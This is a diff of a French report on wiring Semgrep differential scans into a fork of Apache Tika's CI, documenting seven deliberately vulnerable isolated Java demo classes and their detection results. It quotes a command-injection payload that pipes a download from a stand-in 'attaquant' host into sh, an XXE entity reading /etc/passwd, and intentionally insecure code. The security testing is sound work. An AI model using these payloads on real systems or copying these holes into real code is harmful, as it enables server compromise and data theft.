@@ -83,7 +83,7 @@ Fichiers concernés :
 
 La première version utilisait toujours `git merge-base HEAD origin/main`. Lors d'un push sur `main`, cet ancêtre commun est `HEAD` lui-même : la comparaison était vide et un commit vulnérable poussé directement sur `main` passait sans alerte. La nouvelle logique compare chaque push à l'état précédent de la branche. Elle couvre donc aussi ce cas.
 
-**Le contrôle de sécurité conditionne le build (`needs: semgrep`).** Dans la première version, les jobs `semgrep` et `build` étaient parallèles et indépendants : une vulnérabilité faisait échouer le workflow, mais le build Maven (environ 60 minutes) tournait quand même. Avec `needs: semgrep`, le build n'est même pas lancé et le workflow est en échec. C'est le sens le plus strict de « le processus de build échoue », et ça économise des minutes de CI.
+**Le contrôle de sécurité conditionne le build (`needs: semgrep`).** Dans la première version, les jobs `semgrep` et `build` étaient parallèles et indépendants : une vulnérabilité faisait échouer le workflow, mais le build Maven (plus de 30 minutes) tournait quand même. Avec `needs: semgrep`, le build n'est même pas lancé et le workflow est en échec. C'est le sens le plus strict de « le processus de build échoue », et ça économise des minutes de CI.
 
 **Workflow réutilisable plutôt que copier-coller.** La logique Semgrep existait en double (`main-jdk17-build.yml` et `semgrep-validation.yml`). Les deux copies avaient d'ailleurs déjà divergé (voir le bogue ci-dessous). Elle vit maintenant dans un seul fichier, `semgrep-diff.yml` (`on: workflow_call`), appelé par les deux workflows. Ce qui est validé sur la branche de travail est donc exactement ce qui tourne dans le build.
 
@@ -91,7 +91,7 @@ La première version utilisait toujours `git merge-base HEAD origin/main`. Lors 
 
 **Reproductibilité.** La version de Semgrep est figée (`1.185.0`) et Python est installé explicitement (`actions/setup-python`). Sans ça, une nouvelle version de Semgrep ou du jeu de règles pourrait faire échouer un build sans qu'aucun code n'ait changé. Pour les mises à jour, il suffit de changer `SEMGREP_VERSION` dans un commit dédié.
 
-**Jeu de règles `p/java`.** Ce sont les 60 règles Java du registre Semgrep : crypto, injections, XXE, XSS, path traversal, etc. Nous avons écarté `p/default` et `p/security-audit`, qui couvrent beaucoup d'autres langages (YAML, Dockerfile, JavaScript des docs…). Ces règles ajoutent du bruit et du temps de scan pour un projet Java. Le jeu est un paramètre (`config`) du workflow réutilisable, donc facile à changer.
+**Jeu de règles `p/java`.** Ce jeu du registre Semgrep contient 60 règles Java : crypto, injections, XXE, XSS, path traversal, etc. Nous avons écarté `p/default` et `p/security-audit`, qui couvrent beaucoup d'autres langages (YAML, Dockerfile, JavaScript des docs…). Ces règles ajoutent du bruit et du temps de scan pour un projet Java. Le jeu est un paramètre (`config`) du workflow réutilisable, donc facile à changer.
 
 **Sécurité et traçabilité du job.** Le job utilise `permissions: contents: read` (moindre privilège) et `--metrics=off` (aucune télémétrie). Les valeurs venant de l'événement GitHub passent par des variables d'environnement, jamais interpolées directement dans le script, pour éviter l'injection dans le shell. Chaque exécution produit un **Job Summary** avec la liste des nouvelles alertes (règle, sévérité, CWE, `fichier:ligne`) et un artefact `semgrep-new-findings` (JSON complet).
 
@@ -106,25 +106,29 @@ La première version utilisait toujours `git merge-base HEAD origin/main`. Lors 
 
 | # | Scénario | Résultat attendu | Résultat obtenu |
 |---|---|---|---|
-| A | Scan complet du code d'origine, sans `--error` | 11 alertes préexistantes, job vert | ✅ 11 alertes, 60 règles, 1 468 fichiers ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43746199713)) |
-| B | Scan différentiel sans nouvelle vulnérabilité | 0 nouvelle alerte, job vert | ✅ ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43807537450)) |
+| A | Scan complet du code d'origine, sans `--error` | 11 alertes préexistantes, job Semgrep vert | ✅ 11 alertes, 60 règles, 1 468 fichiers, job Semgrep vert ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43746199713)). Le workflow est rouge à cause du build Maven (même cause qu'en 1.6). |
+| B | Scan différentiel sur un commit qui ajoute du Java ne correspondant à aucune règle (classe avec un mot de passe codé en dur, voir 2.10) | 0 nouvelle alerte, job vert | ✅ 0 alerte, job vert ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43807537450)) |
 | C | Ajout progressif de vulnérabilités (1re version) | le nombre d'alertes suit les ajouts, job rouge | ✅ 1 → 7 alertes ([run final](https://github.com/CarlosDanielZQ/tika/actions/runs/43940925801)) |
 | D | `semgrep-validation.yml` avec les 7 vulnérabilités finales (référence `origin/main`) | au moins une nouvelle alerte par vulnérabilité, job rouge, code de sortie 1 | ✅ 8 nouvelles alertes couvrant V1 à V7 (V7 est signalée par deux règles), code de sortie 1 ([run #23](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070624)) |
-| E | `main-jdk17-build.yml` sur une PR `tache3-semgrep` → `main` (fork) qui introduit les 7 vulnérabilités ([PR #1](https://github.com/CarlosDanielZQ/tika/pull/1), fermée sans fusion) | `Semgrep Security Scan` rouge, `build` et `e2e-tests` **ignorés (skipped)**, workflow rouge | ✅ 8 nouvelles alertes par rapport à `main`, code de sortie 1, `build` et `e2e-tests` *skipped*, workflow en échec après 42 s au lieu d'environ 60 min ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43992516267)) |
+| E | `main-jdk17-build.yml` sur une PR `tache3-semgrep` → `main` (fork) qui introduit les 7 vulnérabilités ([PR #1](https://github.com/CarlosDanielZQ/tika/pull/1), fermée sans fusion) | `Semgrep Security Scan` rouge, `build` et `e2e-tests` **ignorés (skipped)**, workflow rouge | ✅ 8 nouvelles alertes par rapport à `main`, code de sortie 1, `build` et `e2e-tests` *skipped*, workflow en échec après 42 s, sans lancer le build Maven de plus de 30 min ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43992516267)) |
 | F | `main-jdk17-build.yml` sur une PR `tache3-validation-f` → `tache3-semgrep` qui modifie du Java **sans** ajouter de vulnérabilité : ajout de `executeSafeQuery`, la version corrigée de V3 avec `PreparedStatement` et un paramètre lié | `Semgrep Security Scan` vert (0 nouvelle alerte, malgré du code SQL très proche de V3), `build` lancé | ✅ « Aucune nouvelle alerte par rapport au commit de référence », Semgrep vert, `build` lancé ([PR #2](https://github.com/CarlosDanielZQ/tika/pull/2), fermée sans fusion, [run](https://github.com/CarlosDanielZQ/tika/actions/runs/43994679815)). Le build Maven a ensuite échoué après 33 min sur `S3PipeIntegrationTest`, pour une raison sans lien avec Semgrep (voir 1.6). |
 
 Les scénarios A à C ont été réalisés avec la première version du workflow. Les scénarios D à F valident la version finale.
 
 **Note sur `workflow_dispatch`.** Le déclencheur manuel ajouté au workflow n'est utilisable qu'une fois le fichier présent sur la branche par défaut (`main`) du dépôt : GitHub n'affiche le bouton « Run workflow » que dans ce cas. Les scénarios E et F passent donc par des pull requests. C'est d'ailleurs l'usage visé : bloquer une PR qui introduit une vulnérabilité.
 
+**Ce qui n'a pas été exercé en CI.** Les exécutions ci-dessus couvrent les cas `pull_request` (E, F) et `baseline-ref` (D). Les cas `push` (référence `github.event.before`) et le repli sur `HEAD~1` (nouvelle branche, force-push, déclenchement manuel) demanderaient de pousser sur `main`. Nous avons vérifié cette partie en exécutant localement le script de l'étape « Determine baseline commit » avec les variables de chaque événement : les six cas renvoient le commit de référence attendu.
+
 ### 1.6. Échec du build Maven indépendant de Semgrep
 
-Dans le scénario F, le contrôle Semgrep a laissé passer le commit et le build Maven complet a démarré. Il a échoué après 33 minutes dans le module `tika-pipes-integration-tests`. Le test `S3PipeIntegrationTest` démarre un serveur MinIO avec Docker Compose (Testcontainers), et la commande `compose up -d` échoue sur le runner GitHub (« Local Docker Compose exited abnormally with code 1 »). C'est le même problème que celui observé lors des premières expérimentations. Il touche le code d'origine de Tika et n'a aucun lien avec nos modifications.
+Dans le scénario F, le contrôle Semgrep a laissé passer le commit et le build Maven complet a démarré. Il a échoué après 33 minutes dans un seul module, `tika-pipes-s3-integration-tests`. Le test `S3PipeIntegrationTest` démarre un serveur MinIO avec Docker Compose (Testcontainers), et le runner GitHub n'a pas pu récupérer l'image `quay.io/minio/minio:latest` (« Local Docker Compose exited abnormally with code 1 »). C'est le même problème que celui observé lors des premières expérimentations. Il touche le code d'origine de Tika et n'a aucun lien avec nos modifications.
 
-Conséquences :
+Ce que le journal de ce build établit :
 
-- Les modules construits avant cet échec, dont `tika-core` qui contient `SemgrepSecurityDemo` et `RickrollDemoTest`, ont passé Spotless, checkstyle, forbiddenapis, la compilation et leurs tests.
-- `tika-server` vient après `tika-pipes` dans l'ordre du réacteur Maven. `SemgrepVulnerableResource` n'a donc pas été compilée par ce build. Elle a été compilée localement avec `javac` contre les signatures des API Jakarta utilisées.
+- **116 modules ont été construits avec succès** avant l'échec, dont `tika-core` (`SemgrepSecurityDemo`, `RickrollDemoTest`) et `tika-server-core` (`SemgrepVulnerableResource`). Les tests d'intégration S3 font partie de `tika-integration-tests`, qui est construit après `tika-server`.
+- Pour ces deux modules, tous les contrôles du build sont passés : Apache RAT, checkstyle, Spotless (`check`), compilation, tests et forbiddenapis. Nos classes vulnérables ne cassent donc rien d'autre : seul Semgrep les bloque.
+- `RickrollDemoTest` est bien ignoré dans un build normal (« Tests run: 1, Skipped: 1 »).
+- Le module racine `Apache Tika` et 6 autres modules n'ont pas été construits (*skipped*), puisque Maven s'arrête au premier échec. Le contrôle Apache RAT de la racine, qui couvre `.github/` et `docs/`, n'a donc pas été exécuté par le CI. Tous nos fichiers portent l'en-tête de licence attendu.
 - Ce vrai échec de test a déclenché le **rickroll dans le build principal** (voir 4.2).
 
 ---
@@ -156,9 +160,9 @@ Les deux décrivent la même faille (CWE-79), à la même ligne.
 
 ### 2.2. Choix des fichiers
 
-- **`tika-core/src/main/java/org/apache/tika/SemgrepSecurityDemo.java`** (V1 à V4). `tika-core` est le module dont dépendent tous les autres. Une faiblesse dans une méthode utilitaire de ce module se propagerait à toute l'application. Ces quatre vulnérabilités n'utilisent que le JDK (`java.net`, `javax.crypto`, `java.sql`, `javax.xml`), il n'y a donc aucune dépendance à ajouter. V4 est particulièrement réaliste pour Tika : Tika analyse des documents XML venant de l'extérieur et fournit `XMLReaderUtils` justement pour créer des parseurs protégés contre XXE. V4 contourne cette protection.
-- **`tika-server/tika-server-core/src/main/java/org/apache/tika/server/core/resource/SemgrepVulnerableResource.java`** (V5 à V7). Path traversal, injection de commande et XSS sont des vulnérabilités **d'application web**. `tika-server-core` est le seul module de Tika qui expose une API HTTP (ressources JAX-RS, dépendance `jakarta.servlet-api`). La ressource suit le style des ressources existantes (`TikaResource`, `TranslateResource`). Les règles Semgrep correspondantes ont besoin d'une **source d'entrée non fiable** : `@PathParam` ou `HttpServletRequest`. Elles ne peuvent pas se déclencher dans `tika-core`.
-- **Isolation.** Les deux classes ne sont appelées nulle part. La ressource n'est **pas enregistrée** dans `TikaServerProcess`, qui déclare explicitement chaque ressource. Elle n'est donc jamais exposée par le serveur. Le comportement et les tests de Tika restent inchangés. Les deux classes respectent les contrôles du build (Spotless, checkstyle, forbiddenapis, Apache RAT) pour que seul Semgrep fasse échouer le CI.
+- **`tika-core/src/main/java/org/apache/tika/SemgrepSecurityDemo.java`** (V1 à V4). `tika-core` est le module dont dépendent presque tous les autres. Une faiblesse dans une méthode utilitaire de ce module se propagerait à toute l'application. Ces quatre vulnérabilités n'utilisent que le JDK (`java.net`, `javax.crypto`, `java.sql`, `javax.xml`), il n'y a donc aucune dépendance à ajouter. V4 est particulièrement réaliste pour Tika : Tika analyse des documents XML venant de l'extérieur et fournit `XMLReaderUtils` justement pour créer des parseurs protégés contre XXE. V4 contourne cette protection.
+- **`tika-server/tika-server-core/src/main/java/org/apache/tika/server/core/resource/SemgrepVulnerableResource.java`** (V5 à V7). Path traversal, injection de commande et XSS sont des vulnérabilités **d'application web**. `tika-server-core` est le module qui porte l'API REST de Tika (ressources JAX-RS, dépendance `jakarta.servlet-api`). La ressource suit le style des ressources existantes (`TikaResource`, `TranslateResource`). Les règles Semgrep correspondantes ont besoin d'une **source d'entrée non fiable** : `@PathParam` ou `HttpServletRequest`. Elles ne peuvent pas se déclencher dans `tika-core`.
+- **Isolation.** Les deux classes ne sont appelées nulle part. La ressource n'est **pas enregistrée** dans `TikaServerProcess`, qui déclare explicitement chaque ressource. Elle n'est donc jamais exposée par le serveur. Le comportement et les tests de Tika restent inchangés. Les deux classes respectent les contrôles du build (Spotless, checkstyle, forbiddenapis, Apache RAT) pour que seul Semgrep fasse échouer le CI. Le journal du build du scénario F le confirme (section 1.6).
 
 ### 2.3. V1 — Transmission en clair (CWE-319)
 
@@ -176,7 +180,7 @@ Socket socket = new Socket();
 return Cipher.getInstance("DES/ECB/PKCS5Padding");
 ```
 
-**Pourquoi c'est vulnérable.** DES n'a qu'une clé effective de 56 bits, cassable en quelques heures par force brute sur du matériel dédié. Le mode ECB chiffre deux blocs identiques de la même façon, ce qui laisse voir la structure des données.
+**Pourquoi c'est vulnérable.** DES n'a qu'une clé effective de 56 bits : une recherche exhaustive de la clé prend environ une journée sur du matériel spécialisé. Le mode ECB chiffre deux blocs identiques de la même façon, ce qui laisse voir la structure des données.
 **Correction.** `Cipher.getInstance("AES/GCM/NoPadding")` avec une clé de 256 bits et un nonce unique.
 **Résultat Semgrep.** ✅ Règle `java.lang.security.audit.crypto.des-is-deprecated.des-is-deprecated`, WARNING, ligne 54.
 
@@ -199,15 +203,16 @@ DocumentBuilder builder = factory.newDocumentBuilder();
 return builder.parse(xml);
 ```
 
-**Pourquoi c'est vulnérable.** Avec sa configuration par défaut, la fabrique accepte les `DOCTYPE` et les entités externes. Un document piégé contenant `<!ENTITY x SYSTEM "file:///etc/passwd">` fait lire un fichier local par le parseur. On peut aussi forcer des requêtes réseau internes (SSRF), ou épuiser la mémoire (« billion laughs »). Pour Tika, dont le métier est de lire des documents non fiables, c'est l'une des vulnérabilités les plus graves.
+**Pourquoi c'est vulnérable.** Avec sa configuration par défaut, la fabrique accepte les `DOCTYPE` et les entités externes. Un document piégé contenant `<!ENTITY x SYSTEM "file:///etc/passwd">` fait lire un fichier local par le parseur. On peut aussi forcer le serveur à émettre des requêtes vers le réseau interne (SSRF). Pour Tika, dont le métier est de lire des documents non fiables, c'est l'une des vulnérabilités les plus graves.
 **Correction.** `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`, ou simplement `XMLReaderUtils` de Tika.
-**Résultat Semgrep.** Règle `java.lang.security.audit.xxe.documentbuilderfactory-disallow-doctype-decl-missing` (analyse de flux : la fabrique atteint `newDocumentBuilder()` sans avoir été sécurisée). ✅ ERROR, ligne 72.
+**Résultat Semgrep.** Règle `java.lang.security.audit.xxe.documentbuilderfactory-disallow-doctype-decl-missing.documentbuilderfactory-disallow-doctype-decl-missing` (analyse de flux : la fabrique atteint `newDocumentBuilder()` sans avoir été sécurisée). ✅ ERROR, ligne 72.
 
 ### 2.7. V5 — Path traversal (CWE-22)
 
 ```java
 @GET
 @Path("/document/{name}")
+@Produces("text/plain")
 public String readDocument(@PathParam("name") String name) throws IOException {
     File document = new File(DOCUMENTS_DIR, name);
     return Files.readString(document.toPath(), UTF_8);
@@ -226,7 +231,8 @@ List<String> command = new ArrayList<>();
 command.add("sh");
 command.add("-c");
 command.add("file --mime-type " + file);
-Process process = new ProcessBuilder(command).start();
+ProcessBuilder builder = new ProcessBuilder(command);
+Process process = builder.start();
 ```
 
 **Pourquoi c'est vulnérable.** Le paramètre HTTP est concaténé dans une chaîne interprétée par `sh -c`. Avec `?file=x;curl http://attaquant/x|sh`, le shell exécute la seconde commande : exécution de code arbitraire sur le serveur, c'est-à-dire une compromission complète.
@@ -252,10 +258,11 @@ Voir 2.1.
 
 ### 2.10. Essais non détectés par `p/java` (et pourquoi)
 
-La première version avait aussi essayé quatre constructions vulnérables que Semgrep n'a pas signalées. La lecture des 60 règles de `p/java` explique pourquoi :
+La première version avait aussi essayé cinq constructions vulnérables que Semgrep n'a pas signalées. La lecture des 60 règles de `p/java` explique pourquoi :
 
 | Essai | Raison de l'absence d'alerte |
 |---|---|
+| Mot de passe codé en dur (`String password = "admin123"`, scénario B) | la seule règle de `p/java` sur les secrets codés en dur vise les secrets JWT de la bibliothèque `java-jwt` |
 | Désérialisation Java native (`ObjectInputStream.readObject`) | `p/java` ne couvre que la désérialisation Jackson (`enableDefaultTyping`) et JMS, pas `ObjectInputStream` |
 | `java.util.Random` pour un jeton | aucune règle de `p/java` ne vise `java.util.Random` |
 | Validation TLS désactivée (`TrustManager` vide) | aucune règle de `p/java` ne vise `X509TrustManager` (seule `weak-ssl-context` vise les vieilles versions de TLS) |
@@ -285,7 +292,7 @@ Résultats du job `full-report` ([run #23](https://github.com/CarlosDanielZQ/tik
 
 | | Avant (`a2d75c2c1`, Tika d'origine) | Après (`18fcd62ad`, 7 vulnérabilités) |
 |---|---|---|
-| Fichiers analysés | 1 468 | 1 470 (+2 : nos deux classes) |
+| Fichiers analysés | 1 468 | 1 470 (+2 : nos deux classes ; Semgrep ignore par défaut les répertoires `test/`, donc `RickrollDemoTest` n'est pas compté) |
 | Alertes | 11 | 19 |
 | Nouvelles alertes | — | **8** |
 | Alertes disparues | — | 0 |
@@ -324,7 +331,7 @@ Nombre d'alertes par règle :
 
 - **Aucune alerte d'origine n'a disparu ou changé** (0 alerte disparue). Les 11 alertes de Tika (sockets, SQL, XXE, AES-ECB, SHA-1) sont des faiblesses historiques hors du périmètre de la tâche, et c'est exactement ce que l'analyse différentielle ignore.
 - **Les 8 nouvelles alertes couvrent les 7 vulnérabilités**, une ou deux par vulnérabilité, toutes dans nos 2 fichiers. Aucune alerte n'apparaît ailleurs dans Tika.
-- Pour 4 règles, Tika avait déjà des alertes (par exemple `unencrypted-socket` : 4 → 5). Comparer seulement les noms de règles ou les totaux ne suffit donc pas pour savoir ce qui est nouveau. C'est la comparaison alerte par alerte qui identifie précisément les 8 nouvelles.
+- Pour 3 des 8 règles déclenchées par nos vulnérabilités, Tika avait déjà des alertes : `unencrypted-socket` (4 → 5), `formatted-sql-string` (2 → 3) et `documentbuilderfactory-disallow-doctype-decl-missing` (1 → 2). Comparer seulement les noms de règles ou les totaux ne suffit donc pas pour savoir ce qui est nouveau. C'est la comparaison alerte par alerte qui identifie précisément les 8 nouvelles.
 - Le scan différentiel du CI (job `Semgrep (nouvelles vulnerabilites)` du même run) rapporte **les mêmes 8 alertes** que la comparaison complète. Le contrôle du build bloque donc exactement ce qui a été introduit, ni plus ni moins.
 
 ---
@@ -359,7 +366,7 @@ D'autres dépôts peuvent la réutiliser avec `uses: CarlosDanielZQ/tika/.github
 
 ### 4.2. Validation
 
-Faire échouer le vrai build de Tika pour tester l'action aurait coûté environ 60 minutes par essai et aurait demandé de casser un vrai test. Nous avons plutôt ajouté :
+Faire échouer le vrai build de Tika pour tester l'action aurait coûté plus de 30 minutes par essai et aurait demandé de casser un vrai test. Nous avons plutôt ajouté :
 
 - [`RickrollDemoTest`](../../tika-core/src/test/java/org/apache/tika/RickrollDemoTest.java) : un test qui échoue volontairement, **mais seulement si** la variable d'environnement `TIKA_RICKROLL_DEMO=true` est définie (`@EnabledIfEnvironmentVariable`). Dans tous les builds normaux, il est ignoré.
 - [`rickroll-validation.yml`](../../.github/workflows/rickroll-validation.yml), qui ne compile que `tika-core` et lance ce test dans deux jobs :
@@ -369,7 +376,7 @@ Faire échouer le vrai build de Tika pour tester l'action aurait coûté environ
 | `test-fails` | `TIKA_RICKROLL_DEMO=true` | job rouge, rickroll (bannière, annotation, Job Summary) | ✅ job rouge, étape rickroll exécutée : annotation « Rickroll (1 test(s) en echec) » et Job Summary avec la vidéo et le test `RickrollDemoTest#testNeverGonnaGiveYouUp` ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070733)) |
 | `test-passes` | absente | test ignoré, job vert, aucun rickroll | ✅ job vert, étape rickroll ignorée (*skipped*) (même [run](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070733)) |
 
-**Rickroll dans le vrai build.** Dans le scénario F (section 1.6), un vrai test de Tika a échoué dans `main jdk17 build` : `S3PipeIntegrationTest` (erreur Docker Compose). L'action s'est déclenchée sans intervention de notre part : annotation « Rickroll (1 test(s) en echec) » et Job Summary « Rickroll ! 1 cas de test en echec » avec la classe et le message d'erreur ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43994679815)). C'est exactement le comportement demandé. Ce run a aussi révélé un petit défaut : l'erreur survenait pendant l'initialisation de la classe de test, et le `<testcase>` JUnit n'avait pas de nom. L'action affiche maintenant « (initialisation de la classe) » au lieu d'une cellule vide.
+**Rickroll dans le vrai build.** Dans le scénario F (section 1.6), un vrai test de Tika a échoué dans `main jdk17 build` : `S3PipeIntegrationTest` (image Docker MinIO introuvable). L'action s'est déclenchée sans intervention de notre part : annotation « Rickroll (1 test(s) en echec) » et Job Summary « Rickroll ! 1 cas de test en echec » avec la classe et le message d'erreur ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43994679815)). C'est exactement le comportement demandé. Ce run a aussi révélé un petit défaut : l'erreur survenait pendant l'initialisation de la classe de test, et le `<testcase>` JUnit n'avait pas de nom. L'action affiche maintenant « (initialisation de la classe) » au lieu d'une cellule vide.
 
 Le script a aussi été testé localement avec un faux rapport JUnit contenant un test en échec (rickroll déclenché, sorties `failed-tests=1`, `rickrolled=true`) et sans rapport (notice, pas de rickroll).
 
@@ -391,7 +398,7 @@ semgrep scan --config p/java --baseline-commit "$(git merge-base HEAD origin/mai
 
 ## 6. Déclaration d'utilisation de l'IA
 
-Nous avons utilisé **ChatGPT (OpenAI)** en novembre 2026 comme assistant technique pour la première version : intégration de Semgrep aux workflows, configuration de l'analyse différentielle, interprétation des résultats et propositions de vulnérabilités à expérimenter.
+Nous avons utilisé **ChatGPT (OpenAI, modèle GPT-6)** en novembre 2026 comme assistant technique pour la première version : intégration de Semgrep aux workflows, configuration de l'analyse différentielle, interprétation des résultats et propositions de vulnérabilités à expérimenter.
 
 Nous avons ensuite utilisé **Claude (Anthropic, via Claude Code)** en novembre 2026 pour réviser cette première version. Il a relevé le bogue YAML, la référence `merge-base` inefficace sur `main`, les vulnérabilités du même type et la comparaison non homogène. Il nous a aidés à écrire le workflow réutilisable, le script de comparaison, l'action rickroll, les vulnérabilités V4 à V7 (calquées sur les cas de test officiels des règles Semgrep) et cette documentation.
 
